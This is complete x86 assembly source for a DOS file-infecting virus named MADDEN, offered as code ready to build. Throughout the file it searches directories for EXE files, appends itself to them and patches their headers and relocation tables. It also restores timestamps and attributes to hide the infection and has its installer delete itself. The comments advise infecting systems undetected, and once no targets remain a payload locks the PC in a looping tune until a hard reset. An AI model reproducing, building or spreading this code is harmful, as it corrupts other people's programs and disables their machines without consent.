;The MADDEN virus is an EXE file infector which can jump from directory to
;directory.   It attaches itself to the end of a file and
;modifies the EXE file header so that it gets control first, before the host
;program. When it is done doing its job, it passes control to the host program,
;so that the host executes without a hint that the virus is there.


	.SEQ                       ;segments must appear in sequential order
				   ;to simulate conditions in actual active virus


;MGROUP  GROUP   HOSTSEG,HSTACK     ;Host stack and code segments grouped together

;HOSTSEG program code segment. The virus gains control before this routine and
;attaches itself to another EXE file. As such, the host program for this
;installer simply tries to delete itself off of disk and terminates. That is
;worthwhile if you want to infect a system with the virus without getting
;caught. Just execute the program that infects, and it disappears without a
;trace. You might want to name the program something more innocuous, though.
;MADDEN also locks the pc into a 'maddening' toon when it runs out
;of files to infect. (MADDEN can be assembled to an .obj file under a86,
;then linked to the 'infected' .exe form.)

HOSTSEG SEGMENT BYTE
	ASSUME  CS:HOSTSEG,SS:HSTACK

PGMSTR  DB 'MADDEN.EXE',0

HOST:
	mov     ax,cs           ;we want DS=CS here
	mov     ds,ax
	mov     dx,OFFSET PGMSTR
	mov     ah,41H
	int     21H             ;delete this exe file
	mov     ah,4CH
	mov     al,0
	int     21H             ;terminate normally
HOSTSEG ENDS


;Host program stack segment

HSTACK  SEGMENT PARA STACK
	db  100H dup (?)        ;100 bytes long
HSTACK  ENDS

;------------------------------------------------------------------------
;This is the virus itself

STACKSIZE       EQU     100H           ;size of stack for the virus
NUMRELS         EQU     2              ;number of relocatables in the virus, which must go in the relocatable pointer table

;VGROUP  GROUP   VSEG,VSTACK    ;Virus code and stack segments grouped together

;MADDEN Virus code segment. This gains control first, before the host. As this
;ASM file is layed out, this program will look exactly like a simple program
;that was infected by the virus.

VSEG    SEGMENT PARA
	ASSUME  CS:VSEG,DS:VSEG,SS:VSTACK

;data storage area comes before any code
VIRUSID DW      0C8AAH                ;identifies virus
OLDDTA  DD      0                     ;old DTA segment and offset
DTA1    DB      2BH dup (?)           ;new disk transfer area
DTA2    DB      56H dup (?)           ;dta for directory finds (2 deep)
EXE_HDR DB      1CH dup (?)           ;buffer for EXE file header
EXEFILE DB      '\*.EXE',0            ;search string for an exe file
ALLFILE DB      '\*.*',0              ;search string for any file
USEFILE DB      78 dup (?)            ;area to put valid file path
LEVEL   DB      0                     ;depth to search directories for a file
HANDLE  DW      0                     ;file handle
FATTR   DB      0                     ;old file attribute storage area
FTIME   DW      0                     ;old file time stamp storage area
FDATE   DW      0                     ;old file date stamp storage area
FSIZE   DD      0                     ;file size storage area
VIDC    DW      0                     ;storage area to put VIRUSID from new host .EXE in, to check if virus already there
VCODE   DB      1                     ;identifies this version
MUZIK   dw      4304,0006, 4063,0006, 4304,0006, 4063,0006, ;MUZIK - notes/delay
	dw      3043,0006, 4831,0006, 4063,0006, 3043,0006, ;in format xxxx,yyyy
	dw      4304,0006, 4063,0006, 4304,0006, 4063,0006,
	dw      3043,0006, 4831,0006, 4063,0006, 3043,0006, 
	dw      4304,0006, 4063,0006, 4304,0006, 4063,0006,
	dw      3043,0006, 4831,0006, 4063,0006, 3043,0006, 
	dw      4304,0006, 4063,0006, 4304,0006, 4063,0006,
	dw      3043,0006, 5119,0006, 5423,0006, 3043,0006, 
	dw      6087,0020, 

	dw      6087,0006, 
	dw      7239,0006, 3619,0006, 4831,0006, 6087,0006
	dw      7670,0006, 7239,0006, 4831,0006, 3619,0006

	dw      6087,0006, 4063,0006, 3043,0006, 5119,0006
	dw      4831,0006, 6087,0006, 7239,0006, 8126,0006
	dw      6087,0020, 

	dw      4304,0006, 4063,0006, 4304,0006, 4063,0006,
	dw      3043,0006, 4831,0006, 4063,0006, 3043,0006, 
	dw      4304,0006, 4063,0006, 4304,0006, 4063,0006,
	dw      3043,0006, 4831,0006, 4063,0006, 3043,0006, 
	dw      4304,0006, 4063,0006, 4304,0006, 4063,0006,
	dw      3043,0006, 5119,0006, 5423,0006, 3043,0006, 
	dw      6087,0020, 

	dw      6087,0006, 
	dw      7239,0006, 3619,0006, 4831,0006, 6087,0006
	dw      7670,0006, 7239,0006, 4831,0006, 3619,0006

	dw      6087,0006, 4063,0006, 3043,0006, 5119,0006
	dw      4831,0006, 6087,0006, 7239,0006, 8126,0006
	dw      6087,0020, 

	dw      7670,0006, 7239,0006, 4831,0006, 3619,0006
	dw      3043,0006, 3619,0006, 4831,0006, 6087,0006
	dw      3043,0010, 

	dw      4304,0006, 4063,0006, 4304,0006, 4063,0006,
	dw      3043,0006, 4831,0006, 4063,0006, 3043,0006, 
	dw      4304,0006, 4063,0006, 4304,0006, 4063,0006,
	dw      3043,0006, 4831,0006, 4063,0006, 3043,0006, 
	dw      4304,0006, 4063,0006, 4304,0006, 4063,0006,
	dw      3043,0006, 5119,0006, 5423,0006, 3043,0006, 
	dw      6087,0020, 

	dw      7670,0006, 7239,0006, 4831,0006, 3619,0006
	dw      3043,0006, 3619,0006, 4831,0006, 6087,0006
	dw      3043,0010, 

	dw      6087,0006, 
	dw      7239,0006, 3619,0006, 4831,0006, 6087,0006
	dw      7670,0006, 7239,0006, 4831,0006, 3619,0006

	dw      6087,0006, 4063,0006, 3043,0006, 5119,0006
	dw      4831,0006, 6087,0006, 7239,0006, 8126,0006
	dw      6087,0020, 

	dw      0ffffh
;--------------------------------------------------------------------------
;MADDEN virus main routine starts here
VIRUS:
	push    ax              ;save startup info in ax
	mov     ax,cs
	mov     ds,ax           ;set up DS=CS for the virus
	mov     ax,es           ;get PSP Seg
	mov     WORD PTR [OLDDTA+2],ax   ;set up default DTA Seg=PSP Seg in case of abort without getting it
	call    SHOULDRUN       ;run only when certain conditions met signalled by z set
	jnz     REL1            ;conditions aren't met, go execute host program
	call    SETSR           ;modify SHOULDRUN procedure to activate conditions
	call    NEW_DTA         ;set up a new DTA location
	call    FIND_FILE       ;get an exe file to attack
	jnz     TOON            ;returned nz - no valid files left, play maddening toon!
	call    SAVE_ATTRIBUTE  ;save the file attributes and leave file opened in r/w mode
	call    INFECT          ;move program code to file we found to attack
	call    REST_ATTRIBUTE  ;restore the original file attributes and close the file
FINISH: call    RESTORE_DTA     ;restore the DTA to its original value at startup
	pop     ax              ;restore startup value of ax
REL1:                           ;relocatable marker for host stack segment
	mov     bx,HSTACK       ;set up host program stack segment (ax=segment)
	cli                     ;interrupts off while changing stack
	mov     ss,bx
REL1A:                          ;marker for host stack pointer
	mov     sp,OFFSET HSTACK
	mov     es,WORD PTR [OLDDTA+2]  ;set up ES correctly
	mov     ds,WORD PTR [OLDDTA+2]  ;and DS
	sti                     ;interrupts back on
REL2:                           ;relocatable marker for host code segment
	jmp     FAR PTR HOST    ;begin execution of host program

;--------------------------------------------------------------------------
;First Level - Find a file which passes FILE_OK
;
;This routine does a complex directory search to find an EXE file in the
;current directory, one of its subdirectories, or the root directory or one
;of its subdirectories, to find a file for which FILE_OK returns with C reset.
;If you want to change the depth of the search, make sure to allocate enough
;room at DTA2. This variable needs to have 2BH * LEVEL bytes in it to work,
;since the recursive FINDBR uses a different DTA area for the search (see DOS
;functions 4EH and 4FH) on each level.
;
FIND_FILE:
	mov     al,'\'                  ;set up current directory path in USEFILE
	mov     BYTE PTR [USEFILE],al
	mov     si,OFFSET USEFILE+1
	xor     dl,dl
	mov     ah,47H
	int     21H                     ;get current dir, USEFILE= \dir
	cmp     BYTE PTR [USEFILE+1],0  ;see if it is null. If so, its the root
	jnz     FF2                     ;not the root
	xor     al,al                   ;make correction for root directory,
	mov     BYTE PTR [USEFILE],al   ;by setting USEFILE = ''
FF2:    mov     al,2
	mov     [LEVEL],al              ;search 2 subdirs deep
	call    FINDBR                  ;attempt to locate a valid file
	jz      FF3                     ;found one - exit
	xor     al,al                   ;nope - try the root directory
	mov     BYTE PTR [USEFILE],al   ;by setting USEFILE= ''
	inc     al                      ;al=1
	mov     [LEVEL],al              ;search one subdir deep
	call    FINDBR                  ;attempt to find file
FF3:
	ret                             ;exit with z flag set by FINDBR to indicate success/failure

;***************************************************************************
; This routine enables MADDEN virus to compell the pc to play a 
;'maddening' toon when it can't find a file to infect
;**************************************************************************
TOON:
	cli                          ;interrupts off
	mov     al,10110110xb        ;the magic number
	out     43h,al               ;send it
	lea     si,MUZIK              ;point (si) to our note table
TOON2:  cld                          ;must increment forward
	lodsw                        ;load word into ax and increment (si)
	cmp     ax,0ffffh            ;is it ffff - if so end of table
	jz      GO_MUZIK2             ;so, time to jump into endless loop
	out     42h,al               ;send LSB first
	mov     al,ah                ;place MSB in al
	out     42h,al               ;send it next
	in      al,61h               ;get value to turn on speaker
	or      al,00000011xb        ;OR the gotten value
	out     61h,al               ;now we turn on speaker
	lodsw                        ;load the repeat loop count into (ax)
LOOP6:  mov     cx,8000              ;delay count
LOOP7:  loop    LOOP7                ;do the delay
	dec     ax                   ;decrement repeat count
	jnz     loop6                ;if not = 0 loop back
	in      al,61h               ;all done
	and     al,11111100xb        ;number turns speaker off
	out     61h,al               ;send it
	jmp     short TOON2          ;now go do next note
GO_MUZIK2:                            ;our loop point
	sti                          ;enable interrupts
	jmp    TOON                  ;jump back to beginning - this code
				     ; has the additional advantage of
				     ;locking out CTRL-ALT-DEL reboot.
				     ;The user must do a hard reset to recover.
;--------------------------------------------------------------------------
;SEARCH FUNCTION
;---------------------------------------------------------------------------
;Second Level - Find in a branch
;
;This function searches the directory specified in USEFILE for EXE files.
;after searching the specified directory, it searches subdirectories to the
;depth LEVEL. If an EXE file is found for which FILE_OK returns with C reset, this
;routine exits with Z set and leaves the file and path in USEFILE
;
FINDBR:
	call    FINDEXE         ;search current dir for EXE first
	jnc     FBE3            ;found it - exit
	cmp     [LEVEL],0       ;no - do we want to go another directory deeper?
	jz      FBE1            ;no - exit
	dec     [LEVEL]         ;yes - decrement LEVEL and continue
	mov     di,OFFSET USEFILE       ;'\curr_dir' is here
	mov     si,OFFSET ALLFILE       ;'\*.*' is here
	call    CONCAT          ;get '\curr_dir\*.*' in USEFILE
	inc     di
	push    di              ;store pointer to first *
	call    FIRSTDIR        ;get first subdirectory
	jnz     FBE             ;couldn't find it, so quit
FB1:                            ;otherwise, check it out
	pop     di              ;strip \*.* off of USEFILE
	xor     al,al
	stosb
	mov     di,OFFSET USEFILE
	mov     bx,OFFSET DTA2+1EH
	mov     al,[LEVEL]
	mov     dl,2BH          ;compute correct DTA location for subdir name
	mul     dl              ;which depends on the depth we're at in the search
	add     bx,ax           ;bx points to directory name
	mov     si,bx
	call    CONCAT          ;'\curr_dir\sub_dir' put in USEFILE
	push    di              ;save position of first letter in sub_dir name
	call    FINDBR          ;scan the subdirectory and its subdirectories (recursive)
	jz      FBE2            ;if successful, exit
	call    NEXTDIR         ;get next subdirectory in this directory
	jz      FB1             ;go check it if search successful
FBE:                            ;else exit, NZ set, cleaned up
	inc     [LEVEL]         ;increment the level counter before exit
	pop     di              ;strip any path or file spec off of original
	xor     al,al           ;directory path
	stosb
FBE1:   mov     al,1            ;return with NZ set
	or      al,al
	ret

FBE2:   pop     di              ;successful exit, pull this off the stack
FBE3:   xor     al,al           ;and set Z
	ret                     ;exit

;--------------------------------------------------------------------------
;Third Level - Part A - Find an EXE file
;
;This function searches the path in USEFILE for an EXE file which passes
;the test FILE_OK. This routine will return the full path of the EXE file
;in USEFILE, and the c flag reset, if it is successful. Otherwise, it will return
;with the c flag set. It will search a whole directory before giving up.
;
FINDEXE:
	mov     dx,OFFSET DTA1  ;set new DTA for EXE search
	mov     ah,1AH
	int     21H
	mov     di,OFFSET USEFILE
	mov     si,OFFSET EXEFILE
	call    CONCAT          ;set up USEFILE with '\dir\*.EXE'
	push    di              ;save position of '\' before '*.EXE'
	mov     dx,OFFSET USEFILE
	mov     cx,3FH          ;search first for any file
	mov     ah,4EH
	int     21H
NEXTEXE:
	or      al,al           ;is DOS return OK?
	jnz     FEC             ;no - quit with C set
	pop     di
	inc     di
	stosb                   ;truncate '\dir\*.EXE' to '\dir\'
	mov     di,OFFSET USEFILE
	mov     si,OFFSET DTA1+1EH
	call    CONCAT          ;setup file name '\dir\filename.exe'
	dec     di
	push    di
	call    FILE_OK         ;yes - is this a good file to use?
	jnc     FENC            ;yes - valid file found - exit with c reset
	mov     ah,4FH
	int     21H             ;do find next
	jmp     SHORT NEXTEXE   ;and go test it for validity

FEC:                            ;no valid file found, return with C set
	pop     di
	mov     BYTE PTR [di],0 ;truncate \dir\filename.exe to \dir
	stc
	ret
FENC:                           ;valid file found, return with NC
	pop     di
	ret


;--------------------------------------------------------------------------
;Third Level - Part B - Find a subdirectory
;
;This function searches the file path in USEFILE for subdirectories, excluding
;the subdirectory header entries. If one is found, it returns with Z set, and
;if not, it returns with NZ set.
;There are two entry points here, FIRSTDIR, which does the search first, and
;NEXTDIR, which does the search next.
;
FIRSTDIR:
	call    GET_DTA         ;get proper DTA address in dx (calculated from LEVEL)
	push    dx              ;save it
	mov     ah,1AH          ;set DTA
	int     21H
	mov     dx,OFFSET USEFILE
	mov     cx,10H          ;search for a directory
	mov     ah,4EH          ;do search first function
	int     21H
NEXTD1:
	pop     bx              ;get pointer to search table (DTA)
	or      al,al           ;successful search?
	jnz     NEXTD3          ;no, quit with NZ set
	test    BYTE PTR [bx+15H],10H    ;is this a directory?
	jz      NEXTDIR         ;no, find another
	cmp     BYTE PTR [bx+1EH],'.'    ;is it a subdirectory header?
	jne     NEXTD2          ;no - valid directory, exit, setting Z flag
				;else it was dir header entry, so fall through to next
NEXTDIR:                        ;second entry point for search next
	call    GET_DTA         ;get proper DTA address again - may not be set up
	push    dx
	mov     ah,1AH          ;set DTA
	int     21H
	mov     ah,4FH
	int     21H             ;do find next
	jmp     SHORT NEXTD1    ;and loop to check the validity of the return

NEXTD2:
	xor     al,al           ;successful exit, set Z flag
NEXTD3:
	ret                     ;exit routine

;--------------------------------------------------------------------------
;Return the DTA address associated to LEVEL in dx. This is simply given by
;OFFSET DTA2 + (LEVEL*2BH). Each level must have a different search record
;in its own DTA, since a search at a lower level occurs in the middle of the
;higher level search, and we don't want the higher level being ruined by
;corrupted data.
;
GET_DTA:
	mov     dx,OFFSET DTA2
	mov     al,2BH
	mul     [LEVEL]
	add     dx,ax                   ;return with dx= proper dta offset
	ret

;--------------------------------------------------------------------------
;Concatenate two strings: Add the asciiz string at DS:SI to the asciiz
;string at ES:DI. Return ES:DI pointing to the end of the first string in the
;destination (or the first character of the second string, after moved).
;
CONCAT:
	mov     al,byte ptr es:[di]     ;find the end of string 1
	inc     di
	or      al,al
	jnz     CONCAT
	dec     di                      ;di points to the null at the end
	push    di                      ;save it to return to the caller
CONCAT2:
	cld
	lodsb                           ;move second string to end of first
	stosb
	or      al,al
	jnz     CONCAT2
	pop     di                      ;and restore di to point to end of string 1
	ret


;--------------------------------------------------------------------------
;Function to determine whether the EXE file specified in USEFILE is useable.
;if so return nc, else return c
;What makes an EXE file useable?:
;              a) The signature field in the EXE header must be 'MZ'. (These
;                 are the first two bytes in the file.)
;              b) The Overlay Number field in the EXE header must be zero.
;              c) There must be room in the relocatable table for NUMRELS
;                 more relocatables without enlarging it.
;              d) The word VIRUSID must not appear in the 2 bytes just before
;                 the initial CS:0000 of the test file. If it does, the virus
;                 is probably already in that file, so we skip it.
;
FILE_OK:
	call    GET_EXE_HEADER         ;read the EXE header in USEFILE into EXE_HDR
	jc      OK_END                 ;error in reading the file, so quit
	call    CHECK_SIG_OVERLAY      ;is the overlay number zero?
	jc      OK_END                 ;no - exit with c set
	call    REL_ROOM               ;is there room in the relocatable table?
	jc      OK_END                 ;no - exit
	call    IS_ID_THERE            ;is id at CS:0000?
OK_END: ret                            ;return with c flag set properly

;--------------------------------------------------------------------------
;Returns c if signature in the EXE header is anything but 'MZ' or the overlay
;number is anything but zero.
CHECK_SIG_OVERLAY:
	mov     al,'M'                  ;check the signature first
	mov     ah,'Z'
	cmp     ax,WORD PTR [EXE_HDR]
	jz      CSO_1                   ;jump if OK
	stc                             ;else set carry and exit
	ret
CSO_1:  xor     ax,ax
	sub     ax,WORD PTR [EXE_HDR+26];subtract the overlay number from 0
	ret                             ;c is set if it's anything but 0

;--------------------------------------------------------------------------
;This function reads the 28 byte EXE file header for the file named in USEFILE.
;It puts the header in EXE_HDR, and returns c set if unsuccessful.
;
GET_EXE_HEADER:
	mov     dx,OFFSET USEFILE
	mov     ax,3D02H                ;r/w access open file
	int     21H
	jc      RE_RET                  ;error opening - C set - quit without closing
	mov     [HANDLE],ax             ;else save file handle
	mov     bx,ax                   ;handle to bx
	mov     cx,1CH                  ;read 28 byte EXE file header
	mov     dx,OFFSET EXE_HDR       ;into this buffer
	mov     ah,3FH
	int     21H
RE_RET: ret                             ;return with c set properly

;--------------------------------------------------------------------------
;This function determines if there are at least NUMRELS openings in the
;current relocatable table in USEFILE. If there are, it returns with
;carry reset, otherwise it returns with carry set. The computation
;this routine does is to compare whether
;    ((Header Size * 4) + Number of Relocatables) * 4 - Start of Rel Table
;is >= than 4 * NUMRELS. If it is, then there is enough room
;
REL_ROOM:
	mov     ax,WORD PTR [EXE_HDR+8] ;size of header, paragraphs
	add     ax,ax
	add     ax,ax
	sub     ax,WORD PTR [EXE_HDR+6] ;number of relocatables
	add     ax,ax
	add     ax,ax
	sub     ax,WORD PTR [EXE_HDR+24] ;start of relocatable table
	cmp     ax,4*NUMRELS            ;enough room to put relocatables in?
RR_RET: ret                             ;exit with carry set properly


;--------------------------------------------------------------------------
;This function determines whether the word at the initial CS:0000 in USEFILE
;is the same as VIRUSID in this program. If it is, it returns c set, otherwise
;it returns c reset.
;
IS_ID_THERE:
	mov     ax,WORD PTR [EXE_HDR+22] ;Initial CS
	add     ax,WORD PTR [EXE_HDR+8]  ;Header size
	mov     dx,16
	mul     dx
	mov     cx,dx
	mov     dx,ax                    ;cxdx = position to look for VIRUSID in file
	mov     bx,[HANDLE]
	mov     ax,4200H                 ;set file pointer, relative to beginning
	int     21H
	mov     ah,3FH
	mov     bx,[HANDLE]
	mov     dx,OFFSET VIDC
	mov     cx,2                     ;read 2 bytes into VIDC
	int     21H
	jc      II_RET                   ;couldn't read - bad file - report as though ID is there so we dont do any more to this file
	mov     ax,[VIDC]
	cmp     ax,[VIRUSID]             ;is it the VIRUSID?
	clc
	jnz     II_RET                   ;if not, then virus is not already in this file
	stc                              ;else it is probably there already
II_RET: ret


;--------------------------------------------------------------------------
;This routine makes sure file end is at paragraph boundary, so the virus
;can be attached with a valid CS. Assumes file pointer is at end of file.
SETBDY:
	mov     al,BYTE PTR [FSIZE]
	and     al,0FH              ;see if we have a paragraph boundary (header is always even # of paragraphs)
	jz      SB_E                ;all set - exit
	mov     cx,10H              ;no - write any old bytes to even it up
	sub     cl,al               ;number of bytes to write in cx
	mov     dx,OFFSET FINAL     ;set buffer up to point to end of the code (just garbage there)
	add     WORD PTR [FSIZE],cx     ;update FSIZE
	adc     WORD PTR [FSIZE+2],0
	mov     bx,[HANDLE]
	mov     ah,40H              ;DOS write function
	int     21H
SB_E:   ret

;--------------------------------------------------------------------------
;This routine moves the virus (this program) to the end of the EXE file
;Basically, it just copies everything here to there, and then goes and
;adjusts the EXE file header and two relocatables in the program, so that
;it will work in the new environment. It also makes sure the virus starts
;on a paragraph boundary, and adds how many bytes are necessary to do that.
;
INFECT:
	mov     cx,WORD PTR [FSIZE+2]
	mov     dx,WORD PTR [FSIZE]
	mov     bx,[HANDLE]
	mov     ax,4200H                ;set file pointer, relative to beginning
	int     21H                     ;go to end of file
	call    SETBDY                  ;lengthen to a paragraph boundary if necessary
	mov     cx,OFFSET FINAL         ;last byte of code
	xor     dx,dx                   ;first byte of code, DS:DX
	mov     bx,[HANDLE]             ;move virus code to end of file being attacked with
	mov     ah,40H                  ;DOS write function
	int     21H
	mov     dx,WORD PTR [FSIZE]     ;find 1st relocatable in code (SS)
	mov     cx,WORD PTR [FSIZE+2]
	mov     bx,OFFSET REL1          ;it is at FSIZE+REL1+1 in the file
	inc     bx
	add     dx,bx
	mov     bx,0
	adc     cx,bx                   ;cx:dx is that number
	mov     bx,[HANDLE]
	mov     ax,4200H                ;set file pointer to 1st relocatable
	int     21H
	mov     dx,OFFSET EXE_HDR+14    ;get correct old SS for new program
	mov     bx,[HANDLE]             ;from the EXE header
	mov     cx,2
	mov     ah,40H                  ;and write it to relocatable REL1+1
	int     21H
	mov     dx,WORD PTR [FSIZE]
	mov     cx,WORD PTR [FSIZE+2]
	mov     bx,OFFSET REL1A         ;put in correct old SP from EXE header
	inc     bx                      ;at FSIZE+REL1A+1
	add     dx,bx
	mov     bx,0
	adc     cx,bx                   ;cx:dx points to FSIZE+REL1A+1
	mov     bx,[HANDLE]
	mov     ax,4200H                ;set file pointer to place to write SP to
	int     21H
	mov     dx,OFFSET EXE_HDR+16    ;get correct old SP for infected program
	mov     bx,[HANDLE]             ;from EXE header
	mov     cx,2
	mov     ah,40H                  ;and write it where it belongs
	int     21H
	mov     dx,WORD PTR [FSIZE]
	mov     cx,WORD PTR [FSIZE+2]
	mov     bx,OFFSET REL2          ;put in correct old CS:IP in program
	add     bx,1                    ;at FSIZE+REL2+1 on disk
	add     dx,bx
	mov     bx,0
	adc     cx,bx                   ;cx:dx points to FSIZE+REL2+1
	mov     bx,[HANDLE]
	mov     ax,4200H                ;set file pointer relavtive to start of file
	int     21H
	mov     dx,OFFSET EXE_HDR+20    ;get correct old CS:IP from EXE header
	mov     bx,[HANDLE]
	mov     cx,4
	mov     ah,40H                  ;and write 4 bytes to FSIZE+REL2+1
	int     21H
					;done writing relocatable vectors
					;so now adjust the EXE header values
	xor     cx,cx
	xor     dx,dx
	mov     bx,[HANDLE]
	mov     ax,4200H                ;set file pointer to start of file
	int     21H
	mov     ax,WORD PTR [FSIZE]     ;calculate new initial CS (the virus' CS)
	mov     cl,4                    ;given by (FSIZE/16)-HEADER SIZE (in paragraphs)
	shr     ax,cl
	mov     bx,WORD PTR [FSIZE+2]
	and     bl,0FH
	mov     cl,4
	shl     bl,cl
	add     ah,bl
	sub     ax,WORD PTR [EXE_HDR+8] ;(exe header size, in paragraphs)
	mov     WORD PTR [EXE_HDR+22],ax;and save as initial CS
	mov     bx,OFFSET FINAL         ;compute new initial SS
	add     bx,10H                  ;using the formula SSi=(CSi + (OFFSET FINAL+16)/16)
	mov     cl,4
	shr     bx,cl
	add     ax,bx
	mov     WORD PTR [EXE_HDR+14],ax  ;and save it
	mov     ax,OFFSET VIRUS           ;get initial IP
	mov     WORD PTR [EXE_HDR+20],ax  ;and save it
	mov     ax,STACKSIZE              ;get initial SP
	mov     WORD PTR [EXE_HDR+16],ax  ;and save it
	mov     dx,WORD PTR [FSIZE+2]
	mov     ax,WORD PTR [FSIZE]     ;calculate new file size
	mov     bx,OFFSET FINAL
	add     ax,bx
	xor     bx,bx
	adc     dx,bx                   ;put it in ax:dx
	add     ax,200H                 ;and set up the new page count
	adc     dx,bx                   ;page ct= (ax:dx+512)/512
	push    ax
	mov     cl,9
	shr     ax,cl
	mov     cl,7
	shl     dx,cl
	add     ax,dx
	mov     WORD PTR [EXE_HDR+4],ax ;and save it here
	pop     ax
	and     ax,1FFH                 ;now calculate last page size
	mov     WORD PTR [EXE_HDR+2],ax ;and put it here
	mov     ax,NUMRELS              ;adjust relocatables counter
	add     WORD PTR [EXE_HDR+6],ax
	mov     cx,1CH                  ;and save data at start of file
	mov     dx,OFFSET EXE_HDR
	mov     bx,[HANDLE]
	mov     ah,40H                  ;DOS write function
	int     21H
	mov     ax,WORD PTR [EXE_HDR+6] ;get number of relocatables in table
	dec     ax                      ;in order to calculate location of
	dec     ax                      ;where to add relocatables
	mov     bx,4                    ;Location= (No in table-2)*4+Table Offset
	mul     bx
	add     ax,WORD PTR [EXE_HDR+24];table offset
	mov     bx,0
	adc     dx,bx                   ;dx:ax=end of old table in file
	mov     cx,dx
	mov     dx,ax
	mov     bx,[HANDLE]
	mov     ax,4200H                ;set file pointer to table end
	int     21H
	mov     ax,WORD PTR [EXE_HDR+22]  ;and set up 2 pointers: init CS = seg of REL1
	mov     bx,OFFSET REL1
	inc     bx                      ;offset of REL1
	mov     WORD PTR [EXE_HDR],bx   ;use EXE_HDR as a buffer to
	mov     WORD PTR [EXE_HDR+2],ax ;save relocatables in for now
	mov     ax,WORD PTR [EXE_HDR+22]  ;init CS = seg of REL2
	mov     bx,OFFSET REL2
	add     bx,3                    ;offset of REL2
	mov     WORD PTR [EXE_HDR+4],bx ;write it to buffer
	mov     WORD PTR [EXE_HDR+6],ax
	mov     cx,8                    ;and then write 8 bytes of data in file
	mov     dx,OFFSET EXE_HDR
	mov     bx,[HANDLE]
	mov     ah,40H                  ;DOS write function
	int     21H
	ret                             ;that's it, infection is complete!

;--------------------------------------------------------------------------
;This routine determines whether the reproduction code should be executed.
;If it returns Z, the reproduction code is executed, otherwise it is not.
;Currently, it only executes if the system time variable is a multiple of
;TIMECT. As such, the virus will reproduce only 1 out of every TIMECT+1
;executions of the program. TIMECT should be 2^n-1
;Note that the ret at SR1 is replaced by a NOP by SETSR whenever the program
;is run. This makes SHOULDRUN return Z for sure the first time, so it
;definitely runs when this loader program is run, but after that, the time must
;be an even multiple of TIMECT+1.
;
TIMECT  EQU     0               ;Determines how often to reproduce (1/64 here)
;
SHOULDRUN:
	xor     ah,ah           ;zero ax to start, set z flag
SR1:    ret                     ;this gets replaced by NOP when program runs
	int     1AH
	and     dl,TIMECT       ;is it an even multiple of TIMECT+1 ticks?
	ret                     ;return with z flag set if it is, else nz set


;--------------------------------------------------------------------------
;SETSR modifies SHOULDRUN so that the full procedure gets run
;it is redundant after the initial load
SETSR:
	mov     al,90H          ;NOP code
	mov     BYTE PTR SR1,al ;put it in place of RET above
	ret                     ;and return

;--------------------------------------------------------------------------
;This routine sets up the new DTA location at DTA1, and saves the location of
;the initial DTA in the variable OLDDTA.
NEW_DTA:
	mov     ah,2FH                  ;get current DTA in ES:BX
	int     21H
	mov     WORD PTR [OLDDTA],bx    ;save it here
	mov     ax,es
	mov     WORD PTR [OLDDTA+2],ax
	mov     ax,cs
	mov     es,ax                   ;set up ES
	mov     dx,OFFSET DTA1          ;set new DTA offset
	mov     ah,1AH
	int     21H                     ;and tell DOS where we want it
	ret

;--------------------------------------------------------------------------
;This routine reverses the action of NEW_DTA and restores the DTA to its
;original value.
RESTORE_DTA:
	mov     dx,WORD PTR [OLDDTA]    ;get original DTA seg:ofs
	mov     ax,WORD PTR [OLDDTA+2]
	mov     ds,ax
	mov     ah,1AH
	int     21H                     ;and tell DOS where to put it
	mov     ax,cs                   ;restore ds before exiting
	mov     ds,ax
	ret

;--------------------------------------------------------------------------
;This routine saves the original file attribute in FATTR, the file date and
;time in FDATE and FTIME, and the file size in FSIZE. It also sets the
;file attribute to read/write, and leaves the file opened in read/write
;mode (since it has to open the file to get the date and size), with the handle
;it was opened under in HANDLE. The file path and name is in USEFILE.
SAVE_ATTRIBUTE:
	mov     ah,43H          ;get file attr
	mov     al,0
	mov     dx,OFFSET USEFILE
	int     21H
	mov     [FATTR],cl      ;save it here
	mov     ah,43H          ;now set file attr to r/w
	mov     al,1
	mov     dx,OFFSET USEFILE
	mov     cl,0
	int     21H
	mov     dx,OFFSET USEFILE
	mov     al,2            ;now that we know it's r/w
	mov     ah,3DH          ;we can r/w access open file
	int     21H
	mov     [HANDLE],ax     ;save file handle here
	mov     ah,57H          ;and get the file date and time
	xor     al,al
	mov     bx,[HANDLE]
	int     21H
	mov     [FTIME],cx      ;and save it here
	mov     [FDATE],dx      ;and here
	mov     ax,WORD PTR [DTA1+28]   ;file size was set up here by
	mov     WORD PTR [FSIZE+2],ax   ;search routine
	mov     ax,WORD PTR [DTA1+26]   ;so move it to FSIZE
	mov     WORD PTR [FSIZE],ax
	ret

;--------------------------------------------------------------------------
;Restore file attribute, and date and time of the file as they were before
;it was infected. This also closes the file
REST_ATTRIBUTE:
	mov     dx,[FDATE]      ;get old date and time
	mov     cx,[FTIME]
	mov     ah,57H          ;set file date and time to old value
	mov     al,1
	mov     bx,[HANDLE]
	int     21H
	mov     ah,3EH
	mov     bx,[HANDLE]     ;close file
	int     21H
	mov     cl,[FATTR]
	xor     ch,ch
	mov     ah,43H          ;Set file attr to old value
	mov     al,1
	mov     dx,OFFSET USEFILE
	int     21H
	ret

FINAL:                                  ;last byte of code to be kept in virus

VSEG    ENDS


;--------------------------------------------------------------------------
;Virus stack segment

VSTACK  SEGMENT PARA STACK
	db STACKSIZE dup (?)
VSTACK  ENDS

	END VIRUS               ;Entry point is the virus
